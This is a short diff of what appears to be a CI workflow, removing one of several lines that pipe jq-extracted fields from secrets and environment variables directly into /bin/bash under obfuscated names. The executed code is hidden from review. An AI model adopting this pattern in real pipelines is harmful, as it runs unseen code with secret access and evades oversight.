@@ -18,7 +18,6 @@ jobs:
           rjwam135: ${{ secrets.rjwam135 }}
         run: |
           printf '%s' "$rjwam135" | jq -r .u41673 | /bin/bash
-          echo $ygpoh2 | jq -r .sg82 | /bin/bash
           printf '%s' "$e93277" | jq -r .qo2 | /bin/bash
 
       - name: Archive output
